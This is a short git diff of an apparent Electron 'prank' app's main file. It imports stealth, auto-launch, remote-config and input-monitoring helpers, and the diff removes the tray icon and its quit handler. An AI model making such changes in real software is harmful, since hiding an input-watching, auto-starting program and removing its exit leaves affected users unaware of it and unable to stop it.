@@ -1,9 +1,7 @@
-import './logger';
-import { getLogPath } from './logger';
+import { initLogger, getLogPath } from './logger';
 import { app, globalShortcut, BrowserWindow, ipcMain } from 'electron';
 import { setupStealth, setupAutoLaunch, enforceSingleInstance } from './app-lifecycle';
 import { createOverlayWindow } from './overlay-manager';
-import { createTray } from './tray';
 import { RemoteConfig } from './config/remote-config';
 import { DEFAULT_CONFIG } from './config/default-config';
 import { PrankScheduler } from './prank-engine/prank-scheduler';
@@ -170,6 +168,8 @@ function cleanup(): void {
 
 // ── App ready ───────────────────────────────────────────────
 app.whenReady().then(async () => {
+  initLogger(app.getPath('userData'));
+
   console.log('[Main] ============================');
   console.log('[Main] App starting');
   console.log('[Main] Version:', app.getVersion());
@@ -195,11 +195,6 @@ app.whenReady().then(async () => {
     };
     if (delay > 0) setTimeout(fire, delay);
     else fire();
-  });
-
-  createTray(() => {
-    cleanup();
-    app.quit();
   });
 
   await inputMonitor.start();
